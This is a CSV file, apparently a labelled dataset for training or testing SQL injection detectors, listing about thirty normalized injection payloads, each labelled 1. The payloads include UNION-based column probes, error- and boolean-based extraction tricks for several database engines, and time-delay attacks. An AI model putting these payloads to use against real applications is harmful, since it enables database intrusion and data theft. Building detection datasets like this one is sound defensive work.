row_index,payload_norm,label,sqli_type_hint
4530,"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'obmu' = 'obmu",1,
4531,"-4705' where 2029 = 2029 union all select 2029,2029,2029#",1,
4532,1 where 4153 = 4153 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,
4533,"1"" ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
4534,"1"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""oxxi"" = ""oxxi",1,
4535,1'|| ( select 'ozoj' where 1608 = 1608,1,
4536,"-5493"" ) ) union all select 8001,8001--",1,
4537,"1' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
4538,"1' ) ) ) union all select null,null,null,null,null,null,null#",1,
4539,"1 ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,
4540,"1"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""dksc"" = ""dksc",1,
4541,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""%"" = """,1,
4542,1' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'ugoz' = 'ugoz,1,
4543,-7207' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'obxw' = 'obxw,1,
4544,1 ) as fhvb where 4008 = 4008,1,
4545,"-4798%' ) ) ) union all select 3330,3330,3330#",1,
4546,"1%' ) union all select null,null,null,null,null,null,null,null#",1,
4547,"-6496"" ) ) ) or 1471 = 5278 and ( ( ( ""zkoj"" = ""zkoj",1,
4548,"waitfor delay '0:0:5' and ( ""%"" = """,1,
4549,"1%"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,1,
4550,"1"" and make_set ( 8403 = 8403,8899 ) and ""fqxr"" like ""fqxr",1,
4551,"waitfor delay '0:0:5' and ( ( ( ""lpeo"" = ""lpeo",1,
4552,"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'drui' like 'drui",1,
4553,1' ) ) ) rlike ( select ( case when ( 5524 = 9582 ) then 1 else 0x28 end ) ) and ( ( ( 'okoj' like 'okoj,1,
4554,"-1337"" ) union all select 7508--",1,
4555,"-2722"" ) or 4907 = 8126#",1,
4556,"1"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""ardk"" like ""ardk",1,
4557,"1%"" ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( ""%"" = """,1,
4558,"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'wytg' = 'wytg",1,
4559,"1%"" ) union all select null#",1,
